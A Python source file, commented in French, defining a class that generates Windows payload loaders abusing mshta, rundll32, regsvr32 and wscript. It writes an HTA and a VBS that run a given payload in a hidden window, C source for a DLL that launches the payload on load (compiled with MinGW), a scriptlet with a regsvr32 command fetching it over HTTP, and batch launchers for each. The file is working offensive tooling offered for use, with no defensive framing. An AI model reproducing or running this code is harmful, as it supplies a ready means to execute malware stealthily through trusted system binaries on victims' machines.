import os
import subprocess

class LOLBASLoader:
    def __init__(self):
        self.techniques = {
            'mshta': self._generate_mshta_loader,
            'rundll32': self._generate_rundll32_loader,
            'regsvr32': self._generate_regsvr32_loader,
            'wscript': self._generate_wscript_loader
        }

    def generate_loader(self, technique, payload_path, output_dir):
        """Génère un loader LOLBAS pour la technique choisie"""
        if technique not in self.techniques:
            raise ValueError(f"Technique {technique} non supportée")
        
        os.makedirs(output_dir, exist_ok=True)
        return self.techniques[technique](payload_path, output_dir)

    def _generate_mshta_loader(self, payload_path, output_dir):
        hta_content = f'''
<html>
<head>
<script language="VBScript">
Set oShell = CreateObject("WScript.Shell")
oShell.Run "{payload_path}", 0, False
window.close()
</script>
</head>
<body></body>
</html>
'''
        hta_path = os.path.join(output_dir, "loader.hta")
        with open(hta_path, 'w') as f:
            f.write(hta_content)

        bat_path = os.path.join(output_dir, "run_mshta.bat")
        with open(bat_path, 'w') as f:
            f.write(f'mshta.exe "{hta_path}"\n')

        return hta_path

    def _generate_rundll32_loader(self, payload_path, output_dir):
        dll_src = f'''
#include <windows.h>
#include <shellapi.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {{
    if (reason == DLL_PROCESS_ATTACH) {{
        ShellExecuteA(NULL, "open", "{payload_path}", NULL, NULL, SW_HIDE);
    }}
    return TRUE;
}}

__declspec(dllexport) void EntryPoint() {{
    ShellExecuteA(NULL, "open", "{payload_path}", NULL, NULL, SW_HIDE);
}}
'''
        src_path = os.path.join(output_dir, "loader_rundll.c")
        dll_path = os.path.join(output_dir, "loader_rundll.dll")

        with open(src_path, 'w') as f:
            f.write(dll_src)

        # Compilation avec MinGW
        try:
            subprocess.run([
                "x86_64-w64-mingw32-gcc",
                src_path, "-shared", "-o", dll_path, "-mwindows"
            ], check=True)
        except Exception as e:
            print(f"[!] Erreur compilation rundll32: {e}")

        bat_path = os.path.join(output_dir, "run_rundll.bat")
        with open(bat_path, 'w') as f:
            f.write(f'rundll32.exe {dll_path},EntryPoint\n')

        return dll_path

    def _generate_regsvr32_loader(self, payload_path, output_dir):
        sct_content = f'''<?XML version="1.0"?>
<scriptlet>
  <registration
    progid="Example"
    classid="{{00000000-0000-0000-0000-000000000001}}"
    >
    <script language="JScript">
        new ActiveXObject("WScript.Shell").Run("{payload_path}");
    </script>
  </registration>
</scriptlet>
'''
        sct_path = os.path.join(output_dir, "payload.sct")
        with open(sct_path, 'w') as f:
            f.write(sct_content)

        bat_path = os.path.join(output_dir, "run_regsvr.bat")
        with open(bat_path, 'w') as f:
            f.write(f'regsvr32 /s /n /u /i:"http://127.0.0.1/payload.sct" scrobj.dll\n')

        return sct_path

    def _generate_wscript_loader(self, payload_path, output_dir):
        vbs = f'''
Set objShell = CreateObject("WScript.Shell")
objShell.Run "{payload_path}", 0
'''
        vbs_path = os.path.join(output_dir, "loader.vbs")
        with open(vbs_path, 'w') as f:
            f.write(vbs)

        bat_path = os.path.join(output_dir, "run_wscript.bat")
        with open(bat_path, 'w') as f:
            f.write(f'wscript.exe "{vbs_path}"\n')

        return vbs_path
